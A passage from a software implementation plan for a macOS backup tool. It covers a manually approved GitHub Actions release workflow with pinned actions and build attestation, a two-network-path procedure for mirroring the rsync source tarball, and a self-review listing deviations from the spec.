- The pin-agreement check, since three witnesses can agree with each
  other and still disagree with what the build enforces.

checkout uses fetch-depth: 0 because the freshness check reads commit
timestamps via git log.

Positive controls recorded below for each branch of the gate.

<paste the control outputs and the four gate outputs here>
MSG
git push -u origin task-12a-actions-lint
gh pr create --fill
gh run watch
```

---
## Task 12: `release.yml`

**Files:**
- Create: `.github/workflows/release.yml`

**Interfaces:**
- Consumes: `make build-rsync`, `make build-real-rsync`, `make test-embed-real-rsync`, the pinned action SHAs.

Plan v1 got the ordering of this task wrong in two ways the review caught: it committed the workflow direct to main with no PR, and it tried to `workflow_dispatch` a workflow that did not yet exist on the default branch. The sequence below fixes both.

- [ ] **Step 12.1: Verify the production environment exists before depending on it**

`environment: production` is the entire manual-approval gate. If the environment does not exist, GitHub runs the job **without** any approval step, and the gate is silently absent.

```bash
gh api repos/maheshmirchandani/Backup-Pro/environments --jq '.environments[].name'
```

If `production` is not listed, MM must create it (Settings, Environments, New environment, name `production`, add himself as a Required reviewer) before this task proceeds. Do not write the workflow against an environment that does not exist and assume it will be created later.

Record the command output in the commit body. This is the check that turns "we have a manual gate" from an assertion into a fact.

- [ ] **Step 12.2: Write the workflow**

```yaml
name: Release

on:
  push:
    tags: ['v*.*.*']
  workflow_dispatch:

permissions:
  contents: read

jobs:
  release:
    runs-on: macos-14
    timeout-minutes: 45
    environment: production
    permissions:
      contents: write       # create the release and upload assets
      attestations: write   # write the provenance attestation
      id-token: write       # OIDC, required by attest-build-provenance
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-go@3041bf56c941b39c61721a86cd11f3bb1338122a # v5.2.0
        with:
          go-version-file: 'go.mod'

      - name: Cache rsync tarball
        uses: actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57 # v4.2.0
        with:
          path: build/cache
          key: rsync-tarball-${{ hashFiles('scripts/rsync.version') }}

      - name: Clean any stale rsync build state
        # The negative-path tests deliberately corrupt build/cache. A
        # release must never inherit that state.
        run: make clean-rsync

      - name: Build rsync universal2
        run: make build-rsync

      - name: Build real-rsync flashbackup binary
        run: make build-real-rsync

      - name: Task 12b-B real-rsync e2e
        run: make test-embed-real-rsync

      - name: Compute artifact SHA256
        id: sha
        run: |
          set -euo pipefail
          shasum -a 256 ./flashbackup > flashbackup.sha256
          cat flashbackup.sha256
          echo "value=$(cut -d' ' -f1 < flashbackup.sha256)" >> "$GITHUB_OUTPUT"

      - name: Generate build provenance attestation
        uses: actions/attest-build-provenance@ef244123eb79f2f7a7e75d99086184180e6d0018 # v1.4.4
        with:
          subject-path: ./flashbackup

      - name: Upload to GitHub Release (DRAFT)
        uses: softprops/action-gh-release@c95fe1489396fe8a9eb87c0abf8aa5b2ef267fda # v2.2.1
        with:
          draft: true
          body: |
            ## ${{ github.ref_name }}

            SHA256: `${{ steps.sha.outputs.value }}`

            Embedded GNU rsync 3.4.1, universal2, built from upstream source
            in this workflow run. Build provenance is on the attestations
            tab; verify with `gh attestation verify flashbackup --repo maheshmirchandani/Backup-Pro`.

            This binary is NOT signed or notarized. macOS Gatekeeper will
            refuse it until you clear the quarantine attribute; see the
            README.
          files: |
            flashbackup
            flashbackup.sha256
```

Two corrections to the spec's sketch. Top-level `permissions` is narrowed to `contents: read` with the write scopes granted at job level only, rather than granting write at the top. And the SHA256 is passed through a step output, because the spec's sketch referenced `${{ env.FLASHBACKUP_SHA256 }}`, a variable nothing ever sets: the release notes would have rendered an empty SHA line.

**OIDC ordering, per spec §5.4:** GitHub issues the OIDC token per job, after the `environment: production` approval fires. The attestation therefore signs a build a human approved. If GitHub changes that ordering, this workflow needs revisiting.

- [ ] **Step 12.3: Push to a branch and dispatch against the branch ref**

The workflow must exist on a ref before it can be dispatched, and it must be proven before it reaches main.

```bash
git checkout -b task-12a-release-workflow
python3 -c "import yaml; yaml.safe_load(open('.github/workflows/release.yml')); print('YAML valid')"
git add .github/workflows/release.yml
git commit -m "ci: manually-gated release workflow with build provenance"
git push -u origin task-12a-release-workflow

# Dispatch against the BRANCH ref, not main. This is the step plan v1
# had backwards.
gh workflow run release.yml --ref task-12a-release-workflow
gh run watch
```

Expected: the run pauses for the `production` environment approval. Approve it, then confirm the build, the 12b-B e2e, the attestation and the draft upload all succeed.

- [ ] **Step 12.4: Verify the draft, then delete it**

```bash
gh release list --limit 5
gh release view <draft-tag> --json assets,isDraft
gh attestation verify flashbackup --repo maheshmirchandani/Backup-Pro
```

The dispatch produced a real draft release from a branch. Delete it once verified so it cannot be confused with a product release:

```bash
gh release delete <draft-tag> --yes
```

- [ ] **Step 12.5: Open the PR and merge**

```bash
gh pr create --fill
```

Paste the dispatch run URL, the approval evidence, the attestation verification output and the four gate outputs into the PR body. Merge once CI and actions-lint are green.

---

## Task 13: Bootstrap the upstream mirror release

The `PRIMARY_URL` in `build-rsync.sh` points at a GitHub Release tag that does not exist until this task creates it. Until then every build silently falls back to samba.org, which works but removes the outage insulation the mirror exists to provide.

This task is MM-side: it needs repository write credentials and a second network path. **Do not attempt it from an automated session.**

**Files:** none in the repository. The artefact is a GitHub Release.

- [ ] **Step 13.1: Start from a clean cache**

```bash
make clean-rsync
```

Mandatory. Task 6's negative tests deliberately corrupt `build/cache`, and a rejected or bit-flipped tarball must not be what gets mirrored.

- [ ] **Step 13.2: Fetch and verify from the first network path**

```bash
./scripts/build-rsync.sh --verify-only
shasum -a 256 build/cache/rsync-3.4.1.tar.gz
```

- [ ] **Step 13.3: Re-verify from a second, independent network path**

Tether to a phone, or use a different ISP. Download the tarball again and compare byte-for-byte:

```bash
curl -fSL -o /tmp/rsync-second-path.tar.gz https://download.samba.org/pub/rsync/src/rsync-3.4.1.tar.gz
shasum -a 256 /tmp/rsync-second-path.tar.gz
cmp build/cache/rsync-3.4.1.tar.gz /tmp/rsync-second-path.tar.gz && echo "byte-identical across two network paths"
```

This defeats the chain where samba.org is compromised at the moment of bootstrap and the attestation is written from that same compromised view. If the two paths disagree, stop and report.

- [ ] **Step 13.4: Create the mirror release**

The `--prerelease --latest=false` flags are not optional: without them this mirror release shadows real product releases in the GitHub UI and in the `latest` API.

```bash
gh release create upstream-mirror-rsync-3.4.1 \
  build/cache/rsync-3.4.1.tar.gz \
  --title "Upstream mirror: GNU rsync 3.4.1 source" \
  --notes "Byte-identical mirror of https://download.samba.org/pub/rsync/src/rsync-3.4.1.tar.gz, SHA256 pinned in scripts/rsync.version and attested in scripts/rsync.version.attestation. Mirrored so FlashBackup release builds are insulated from samba.org outages. Not a FlashBackup product release." \
  --prerelease \
  --latest=false
```

- [ ] **Step 13.5: Verify the uploaded asset from a second session**

```bash
gh release view upstream-mirror-rsync-3.4.1 --json assets
curl -fSL -o /tmp/rsync-from-mirror.tar.gz \
  "https://github.com/maheshmirchandani/Backup-Pro/releases/download/upstream-mirror-rsync-3.4.1/rsync-3.4.1.tar.gz"
shasum -a 256 /tmp/rsync-from-mirror.tar.gz
```

The SHA must equal the pin. Ideally fetch from a different network again.

- [ ] **Step 13.6: Prove the primary path is now live**

```bash
make clean-rsync
./scripts/build-rsync.sh --verify-only 2>&1 | tee /tmp/primary-check.log
grep -q "primary mirror unreachable" /tmp/primary-check.log \
  && echo "FAIL: still falling back to samba.org" \
  || echo "OK: primary mirror served the tarball"
```

This is the positive control for the whole task. Before Task 13 the fallback line appears; after it, it must not.

- [ ] **Step 13.7: Record the bootstrap**

No code changes, so there is nothing to commit here. Append the transcripts to `docs/BACKLOG.md` under the current status section, and note that `docs/runbooks/rsync-version-bump.md` (Task 12d) must capture this procedure for the next version bump.

---

## Self-review

Run against the locked spec on Mon, 24 Aug 2026.

### Spec coverage

| Spec requirement | Task |
|---|---|
| §4.1 Minimal build config | 3 |
| §4.2 Build-tag embed swap, `make build` preserved | 4, 5 |
| §4.3 All four invocation contexts | 4 (local), 10 (CI smoke), 12 (CI release) |
| §4.4 Triple-witness pin and attestation | 2 |
| §4.4 Mirror bootstrap procedure | 13 |
| §4.5 Task 12b-A | 7 |
| §4.5 Task 12b-B | 9 |
| §4.5 Fixture extension (g) and (h) | 8 |
| §4.6 / §5.4 CI permissions, manual gate, attestation, SHA pins, anti-regression lints | 10, 11, 12 |
| §5.1 Build script structure | 3 |
| §5.2 Go-side embed selection and the extraction audit | 1, 5 |
| §5.3 Makefile additions | 4 |
| §6 Test strategy, four script negative tests | 6 |
| AC-12a-1 to 12a-9 | 3, 4, 5, 9 |
| AC-12b-1 to 12b-4 | 6, 7, 8, 9 |
| AC-CI-1 to CI-3 | 10, 11, 12 |

No spec requirement is unassigned. Task 12c (CVE posture) and 12d (runbooks) remain separately tracked per §9.1 and are out of this plan's scope; both are overdue and should be scheduled at plan review.

### Deviations from the locked spec, for MM's decision at plan review

1. **`bytes_transferred` does not exist** (AC-12b-1, AC-12b-2). Substituted `files_succeeded` and `files_failed` assertions. Evidence: `internal/state/runlog.go:28-46` and a grep returning nothing. This is the only change to what the acceptance criteria *assert*.
2. **The pathological tripwire test did not exist.** The plan adds it rather than re-baselining it. No behavioural change to the product.
3. **`FLASHBACKUP_E2E=1` added to both Makefile test targets.** Without it the targets pass having run nothing.
4. **Action pinning moved earlier than the lint that enforces it** (Task 10 before Task 11), because eleven existing floating references would otherwise turn main red the moment the lint lands.
5. **Release workflow permissions narrowed** to job level, and the release-notes SHA passed via a step output instead of an unset `env.FLASHBACKUP_SHA256`.
6. **CI runtime smoke is limited to build-plus-init**, not a full backup, because non-interactive profile seeding needs a helper. Flagged as a scope limit, not an oversight.
7. **Extraction audit findings differ from the spec's assumptions** (no `O_EXCL`; verification before rather than after the rename). Task 1 fixes the first and documents the second as deliberate.

### Placeholder scan

No `TBD`, no `implement later`, no "add appropriate error handling", no "similar to Task N". Every action SHA is a resolved 40-hex value, verified as a commit object on Mon, 24 Aug 2026. Two values are intentionally left for the implementer to supply because they cannot be known in advance: `<AGREED_SHA256>` in Task 2, which is the output of the witness collection, and the build wall-clock time in Task 3.

### Type and signature consistency

Every Go signature used in Tasks 1, 5, 7, 8 and 9 was copied from the file it lives in and is listed in Verified ground truth. Specific checks: `SeedProfile` has six parameters and no return; `RunBackup` returns `(int, string, string)`; `buildBinaryAtPath` takes `(string, []string)`; `findRepoRoot` is unexported and callable within package `e2e`; `StreamSHA256` takes an `io.Reader`, so callers must open the file themselves; `paths.Prefix` takes two arguments while `paths.Namespaced` takes four. `context.Background()` is used throughout, since `t.Context()` does not exist in Go 1.23.

### Known residual risk

`test/e2e/embedded_real_rsync_test.go` assumes the destination layout is `<destRoot>/<basename-of-source>/<rel>`. `backup_happy_test.go` deliberately avoids asserting that shape. Step 9.4 requires the implementer to observe the real layout and correct the path arithmetic rather than trusting this assumption. This is the one place in the plan where a code detail was inferred rather than observed, and it is flagged as such at the point of use.

---

## Execution notes

Tasks 1 through 9 are ordinary in-repo work and commit direct to main, matching this project's established practice. Tasks 10, 11 and 12 touch `.github/workflows/` and go through a branch and a PR, because a broken workflow on main blocks every subsequent push. Task 13 is MM-side and needs credentials plus a second network path.

Dependency order: 2 before 3; 3 before 4; 4 and 5 before 9; 8 before 9; 10 before 11; 6 and 12 both require `make clean-rsync` at their boundaries because the negative tests pollute the cache.

Tasks 1, 2, 6, 7 and 8 have no dependency on each other and can be worked in parallel by separate subagents if the executor wishes. Every subagent prompt must carry the Global Constraints section and the pre-commit gate block verbatim.
